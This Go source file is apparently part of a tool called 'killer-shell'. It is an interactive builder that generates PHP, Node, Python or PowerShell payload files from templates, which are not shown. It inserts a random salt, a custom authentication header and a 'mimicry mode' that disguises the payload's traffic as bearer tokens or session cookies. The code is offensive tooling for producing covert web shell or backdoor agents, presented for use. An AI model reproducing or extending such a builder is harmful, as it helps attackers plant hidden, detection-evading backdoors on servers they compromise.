package builder

import (
	"bufio"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/ash7x-la/killer-shell/internal/template"
)

const (
	cyan   = "\033[36m"
	green  = "\033[32m"
	yellow = "\033[33m"
	reset  = "\033[0m"
)

var DefaultHeader = "X-Shield-Key"
var StaticCookie = "__session_cache"

func BuildPayload() {
	var targetType, outFile, customHeader string
	fmt.Printf("\n%s[ PAYLOAD GENERATOR ]%s\n", yellow, reset)
	fmt.Print("Type (php/node/python): ")
	fmt.Scanln(&targetType)
	fmt.Print("Header Key (Default: X-Shield-Key): ")
	fmt.Scanln(&customHeader)
	if customHeader == "" {
		customHeader = DefaultHeader
	}

	var mimicry string
	fmt.Print("Mimicry Mode (0: None, 1: Authorization-Bearer, 2: Cookie): ")
	fmt.Scanln(&mimicry)

	fmt.Print("Output File (e.g. out.php): ")
	fmt.Scanln(&outFile)

	if targetType == "" || outFile == "" {
		return
	}

	fmt.Printf("%s[*]%s Forging resilient %s payload...\n", cyan, reset, strings.ToUpper(targetType))

	var code string
	switch strings.ToLower(targetType) {
	case "php":
		code = template.TplPHP
	case "node":
		code = template.TplNode
	case "python":
		code = template.TplPython
	case "ps1":
		code = template.TplPS1
	default:
		return
	}

	// We'll actually pass the mimicry type as a constant to the agent
	code = strings.ReplaceAll(code, "__MIMICRY_MODE__", mimicry)

	salt := make([]byte, 16)
	rand.Read(salt)
	saltHex := hex.EncodeToString(salt)

	code = strings.ReplaceAll(code, "__SALT_KEY__", saltHex)
	code = strings.ReplaceAll(code, "__HEADER_NAME__", customHeader)
	code = strings.ReplaceAll(code, "__COOKIE_NAME__", StaticCookie)

	os.MkdirAll("output", 0755)
	finalPath := filepath.Join("output", outFile)
	ioutil.WriteFile(finalPath, []byte(code), 0644)

	fmt.Printf("%s[✓]%s Payload saved to: %s\n", green, reset, finalPath)
	fmt.Printf("%s[i]%s Configured Header Key: %s\n", yellow, reset, customHeader)
	fmt.Printf("%s[i]%s Agent Salt (HEX): %s\n", yellow, reset, saltHex)
	fmt.Print("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}
